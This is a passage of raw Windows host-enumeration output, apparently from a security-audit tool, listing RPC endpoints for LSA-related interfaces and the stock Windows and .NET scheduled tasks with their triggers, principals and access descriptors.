  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49664]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49668]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_np:[\\pipe\\lsass]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[audit]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[securityevent]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSARPC_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsacap]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_EAS_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsapolicylookup]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsasspirpc]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[protected_storage]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[SidKey Local End Point]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[samss lpc]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_ip_tcp:[49664]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[NETLOGON_LRPC]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_ip_tcp:[49668]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49664]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49668]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49664]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
====== SCCM ======

  Server                         : 
  SiteCode                       : 
  ProductVersion                 : 
  LastSuccessfulInstallParams    : 

====== ScheduledTasks ======

Non Microsoft scheduled tasks (via WMI)

  Name                              :   Server Initial Configuration Task
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%systemroot%\system32\SrvInitConfig.exe,-100)
  Description                       :   $(@%systemroot%\system32\SrvInitConfig.exe,-101)
  Source                            :   
  State                             :   Disabled
  SDDL                              :   
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /disableconfigtask
      Execute                       :   %windir%\system32\srvinitconfig.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {84F0FAE1-C27B-4F6F-807B-28CF6F96287D}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 64
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {429BC048-379E-45E0-80E4-EB1977941B5C}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 64 Critical
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   False
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {613FBA38-A3DF-4AB8-9674-5604984A299A}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskIdleTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 Critical
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   False
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {DE434264-8FE9-4C0B-A83B-89EBEEBFF78E}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskIdleTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Pre-staged app cleanup
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;GA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
      Execute                       :   %windir%\system32\rundll32.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1H
      ------------------------------

  Name                              :   BitLocker Encrypt All Drives
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   BitLockerEncryptAllDrives
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   BitLocker MDM policy Refresh
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   BitLockerPolicy
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   SyspartRepair
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FR;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir% /sysrepair
      Execute                       :   %windir%\system32\bcdboot.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   CreateObjectTask
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;IU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {E4544ABA-62BF-4C54-AAB2-EC246342626C}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Device
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;GA;;;BA)(A;;GA;;;SY)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   P4D
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   SystemCxt
      Execute                       :   %windir%\system32\devicecensus.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2008-09-01T03:00:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   PT2H
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Device User
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;GA;;;BA)(A;;GA;;;SY)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   P4D
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   UserCxt
      Execute                       :   %windir%\system32\devicecensus.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT2M
      ------------------------------

  Name                              :   DirectXDatabaseUpdater
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\system32\directxdatabaseupdater.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      Delay                         :   PT10M
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   DXGIAdapterCache
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\system32\dxgiadaptercache.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1M
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Diagnostics
  Principal                         :
      GroupId                       :   
      Id                            :   System
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -z
      Execute                       :   %windir%\system32\disksnapshot.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   StorageSense
  Principal                         :
      GroupId                       :   
      Id                            :   System
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {AB2A519B-03B0-43CE-940A-A73DF850B49A}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   EDP App Launch Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   AppLaunch
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   EDP Auth Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   ReAuth
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   EDP Inaccessible Credentials Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   MissingCredentials
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   StorageCardEncryption Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   SDCardEncryptionPolicy
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   LocalUserSyncDataAvailable
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {8E7C2AFB-72B9-415C-9AC2-5037693309B7}
      Data                          :   LocalUserSyncDataAvailable
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   MouseSyncDataAvailable
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {378EAB97-EFD6-4ED5-9AD9-E64A6AA1E6FA}
      Data                          :   MouseSyncDataAvailable
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   PenSyncDataAvailable
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {378EAB97-EFD6-4ED5-9AD9-E64A6AA1E6FA}
      Data                          :   PenSyncDataAvailable
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   TouchpadSyncDataAvailable
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {378EAB97-EFD6-4ED5-9AD9-E64A6AA1E6FA}
      Data                          :   TouchpadSyncDataAvailable
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   ScanForUpdates
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {A558C6A5-B42B-4C98-B610-BF9559143139}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2013-12-31T17:00:00-07:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   P1D
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   False
      StartBoundary                 :   2013-12-31T17:00:00-07:00
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   ScanForUpdatesAsUser
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   AllUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
